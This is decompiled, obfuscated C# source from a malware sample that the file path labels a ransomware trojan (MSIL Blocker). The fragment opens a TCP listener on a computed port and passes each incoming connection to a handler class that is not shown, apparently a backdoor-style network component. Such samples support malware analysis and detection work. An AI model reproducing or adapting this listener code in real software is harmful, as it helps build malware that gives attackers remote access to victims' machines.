// Decompiled with JetBrains decompiler
// Type: M6-n. i>O.AhRC.fS
// Assembly: ]\r, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 954C3D5E-708C-4DD0-82B7-DE2C5BD9F148
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-b8539742a30b177b50768aa3e2c5af8a1f70cde6bd248fc157300ef1b9642f75.exe

using M\u000E6\u002Dn\u0008;
using M\u000E6\u002Dn\u0008.\u0020\u001A\u000F\u000Bi\u003E\u001BO.\u0016Ah\u0011\u0013\u0012\u001FRC;
using System;
using System.Net;
using System.Net.Sockets;

namespace M\u000E6\u002Dn\u0008.\u0020\u001A\u000F\u000Bi\u003E\u001BO.\u0016Ah\u0011\u0013\u0012\u001FRC
{
  internal class \u001CfS\u008B
  {
    private static Socket \u0011\u0027c = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

    public static void e\u0016\u000F\u001B\u0018\u00218()
    {
      try
      {
        uint num = 3000;
        for (int index = 0; index < m\u003D\u000D.\u0029\u0020\u0018.Length; ++index)
          num += (uint) m\u003D\u000D.\u0029\u0020\u0018[index];
        m\u003D\u000D.\u000C\u0011A\u0001 = (ushort) (num % 65000U);
        \u001CfS\u008B.\u0011\u0027c.Bind((EndPoint) new IPEndPoint(IPAddress.Any, (int) m\u003D\u000D.\u000C\u0011A\u0001));
        \u001CfS\u008B.\u0011\u0027c.Listen(50);
        \u001CfS\u008B.\u0011\u0027c.BeginAccept(new AsyncCallback(\u001CfS\u008B.w\u0009MoR2\u0027\u0023\u002C), (object) \u001CfS\u008B.\u0011\u0027c);
      }
      catch
      {
        \u001CfS\u008B.\u00164\u0007\u003C\u000D\u000B\u0021\u0040();
      }
    }

    public static void \u00164\u0007\u003C\u000D\u000B\u0021\u0040()
    {
      try
      {
        m\u003D\u000D.\u000C\u0011A\u0001 = (ushort) 0;
        \u001CfS\u008B.\u0011\u0027c.Close();
      }
      catch
      {
      }
    }

    private static void w\u0009MoR2\u0027\u0023\u002C(IAsyncResult _param0)
    {
      try
      {
        Socket socket = ((Socket) _param0.AsyncState).EndAccept(_param0);
        if (socket != null)
          new \u0034Z\u00133\u0016(socket).\u0031\u0028\u000A\u0014E();
        ((Socket) _param0.AsyncState).BeginAccept(new AsyncCallback(\u001CfS\u008B.w\u0009MoR2\u0027\u0023\u002C), (object) (Socket) _param0.AsyncState);
      }
      catch
      {
      }
    }
  }
}
